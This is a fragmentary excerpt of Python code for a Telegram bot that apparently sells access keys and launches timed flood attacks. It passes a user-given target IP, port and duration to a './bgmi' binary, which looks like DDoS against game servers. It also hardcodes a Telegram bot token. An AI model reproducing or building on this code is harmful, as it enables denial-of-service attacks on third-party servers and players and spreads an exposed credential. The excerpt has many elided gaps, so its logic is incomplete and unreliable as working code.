...
bot = telebot.TeleBot('7703349553:AAFZS-kHBWJ7Lf01gN10zLpVOjEYAqmP_fs')
...
MAX_ATTACK_TIME = 280  # Example: Default maximum attack time set to 280 seconds
...
def create_random_key():
    key = "NARUTOMODZ" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./bgmi {target} {port} {attack_time} 512 1200"  # ✅ Correct variable name
